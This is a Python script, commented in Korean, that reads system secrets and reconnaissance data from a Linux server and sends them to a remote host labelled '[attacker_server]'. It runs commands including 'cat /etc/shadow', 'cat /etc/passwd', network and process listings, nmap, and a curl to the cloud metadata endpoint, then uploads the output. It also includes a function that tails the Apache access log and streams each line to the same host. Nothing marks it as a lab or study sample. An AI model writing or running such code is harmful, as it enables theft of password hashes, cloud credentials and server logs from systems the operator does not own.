import os
import time
import requests
import subprocess

# 로그 파일 경로
LOG_FILE_PATH = '/var/log/httpd/access_log'
# 로그를 전송할 원격 서버 URL
REMOTE_SERVER_URL = 'http://[attacker_server]/upload_log.php'

def send_log(log_line):
    try:
        with open("temp_log.txt", "w") as temp_log:
            temp_log.write(log_line)

        with open("temp_log.txt", "rb") as temp_log_file:
            files = {'logToUpload': temp_log_file}
            response = requests.post(REMOTE_SERVER_URL, files=files, timeout=5)  # Add timeout for network resilience
        
        if response.status_code == 200:
            print(f'Successfully sent log: {log_line}')
        else:
            print(f'Failed to send log: {log_line}. Status code: {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'Error sending log: {e}')
    except Exception as e:
        print(f'Unexpected error sending log: {e}')
    finally:
        if os.path.exists("temp_log.txt"):
            os.remove("temp_log.txt")


def collect_system_info():
    commands = [
        "uname -a",
        "ifconfig -a",
        "id",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "netstat -rn",
        "netstat -tuln",
        "ss -tuln",
        "lsof -i",
        "arp -a",
        "nmap localhost",
        "ps aux",
        "rpm -qa",
        "last",
        "df-h",
        "cat /etc/issue",
        "curl http://169.254.169.254/latest/meta-data",
        "sudo cat /var/log/httpd/access_log"
    ]
    
    system_info = ""
    for command in commands:
        try:
            output = subprocess.check_output(command, shell=True, text=True)
            system_info += f"\n\n--- {command} ---\n{output}"
        except subprocess.CalledProcessError as e:
            system_info += f"\n\n--- {command} ---\nError: {str(e)}"

    return system_info

def monitor_log_file(log_file_path):
    with open(log_file_path, 'r') as log_file:
        # 파일 끝으로 이동
        log_file.seek(0, os.SEEK_END)
        
        while True:
            line = log_file.readline()
            if line:
                send_log(line)
            else:
                time.sleep(1)

if __name__ == "__main__":
    print(f'Started monitoring {LOG_FILE_PATH}')
    system_info = collect_system_info()
    send_log(system_info)

